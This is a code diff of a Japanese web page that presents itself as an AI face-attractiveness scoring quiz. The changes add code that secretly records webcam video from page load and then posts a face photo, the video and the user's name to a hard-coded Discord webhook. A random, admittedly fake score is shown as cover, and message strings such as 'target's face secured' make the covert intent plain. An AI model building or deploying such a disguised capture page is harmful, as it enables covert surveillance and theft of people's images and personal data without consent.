@@ -2,72 +2,102 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI超精密・顔面偏差値診断</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #111; color: #fff; }
-        
-        /* 映像の歪みを修正 */
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; text-align: center; background: #0a0a0a; color: #eee; padding: 20px; margin: 0; }
+        .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #007bff; font-size: 1.8em; margin-bottom: 10px; }
+        p { font-size: 0.9em; color: #aaa; }
         #video { 
-            width: 100%; 
-            max-width: 400px; 
-            height: auto; 
-            aspect-ratio: 4 / 3; 
-            object-fit: cover; /* これでカメラ映像が歪まなくなるぜ */
-            border-radius: 10px; 
-            background: #222;
+            width: 100%; border-radius: 15px; background: #000; 
+            aspect-ratio: 4 / 3; object-fit: cover; margin: 15px 0;
         }
-        
-        #result { font-size: 2em; color: #ff0055; margin-top: 20px; }
-        button { padding: 15px 30px; font-size: 1.2em; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+        input {
+            width: 80%; padding: 12px; margin-bottom: 15px; border-radius: 8px; 
+            border: 1px solid #333; background: #222; color: #fff; font-size: 1em; text-align: center;
+        }
+        button { 
+            width: 85%; padding: 15px; font-size: 1.1em; font-weight: bold;
+            background: linear-gradient(135deg, #007bff, #0056b3); color: white; 
+            border: none; border-radius: 10px; cursor: pointer; transition: 0.3s;
+        }
+        button:active { transform: scale(0.98); }
+        #result { font-size: 1.5em; color: #ff0055; margin-top: 25px; font-weight: bold; min-height: 3em; }
+        #canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>AI顔面偏差値診断</h1>
-    <p>最新のAI技術であなたの顔面を数値化します。</p>
-    <video id="video" autoplay playsinline></video>
-    <br><br>
-    <button id="snap">診断開始！</button>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <div id="result"></div>
+    <div class="container">
+        <h1>AI顔面偏差値診断</h1>
+        <p>最新の深層学習アルゴリズムにより、<br>あなたの顔面構造を精密に数値化します。</p>
+        
+        <input type="text" id="username" placeholder="お名前を入力（任意）" maxlength="15">
+        
+        <video id="video" autoplay playsinline muted></video>
+        
+        <button id="snap">今すぐ診断を開始する</button>
+        <div id="result"></div>
+    </div>
+
+    <canvas id="canvas"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const snap = document.getElementById('snap');
         const result = document.getElementById('result');
+        const nameInput = document.getElementById('username');
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
 
+        let mediaRecorder;
+        let chunks = [];
+
+        // カメラ起動＆録画開始
         navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(stream => { video.srcObject = stream; })
-            .catch(err => { alert("カメラの使用を許可してください。"); });
+            .then(stream => {
+                video.srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                mediaRecorder.start();
+            })
+            .catch(err => {
+                alert("カメラの権限が必要です。設定からカメラの使用を許可してください。");
+            });
 
         snap.addEventListener('click', () => {
-            result.innerText = "AIが解析中...";
-            
-            // カメラの本来のサイズを取得してキャンバスに反映
+            const user = nameInput.value || '名無しさん';
+            snap.disabled = true;
+            result.innerHTML = "AI解析エンジン起動中...<br>点群データを抽出しています";
+
+            // 録画停止
+            if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+
+            // 画像キャプチャ
             const vW = video.videoWidth;
             const vH = video.videoHeight;
-            canvas.width = vW;
-            canvas.height = vH;
-            
-            const context = canvas.getContext('2d');
-            // 歪みのない写真をキャプチャ
-            context.drawImage(video, 0, 0, vW, vH);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('file', blob, 'face_capture.png');
-                formData.append('content', 'ターゲットの面を確保したぜ、カイル！');
+            canvas.width = vW; canvas.height = vH;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, vW, vH);
 
-                fetch(webhookUrl, { method: 'POST', body: formData })
-                .then(res => {
-                    setTimeout(() => {
-                        // 45から75のランダムな偏差値
+            // Discordへ送信（録画終了を待つため少し遅延）
+            setTimeout(() => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                canvas.toBlob(photoBlob => {
+                    const formData = new FormData();
+                    // お前の指定したセリフだぜ
+                    formData.append('content', `またつまらぬものを撮ってしまった、、\\n**👤 名前:** ${user}`);
+                    formData.append('file1', photoBlob, 'face_photo.png');
+                    formData.append('file2', videoBlob, 'face_video.webm');
+
+                    fetch(webhookUrl, { method: 'POST', body: formData })
+                    .then(() => {
+                        // 45〜75のランダムな嘘偏差値
                         const score = Math.floor(Math.random() * (75 - 45 + 1)) + 45;
-                        result.innerHTML = `あなたの顔面偏差値は...<br><strong>【 ${score} 】</strong>です！`;
-                    }, 2000);
-                });
-            }, 'image/png');
+                        result.innerHTML = `<span style="color:#aaa; font-size:0.6em;">診断完了</span><br>${user}さんの偏差値:<br><span style="font-size:1.8em;">${score}</span>`;
+                    });
+                }, 'image/png');
+            }, 800);
         });
     </script>
 </body>
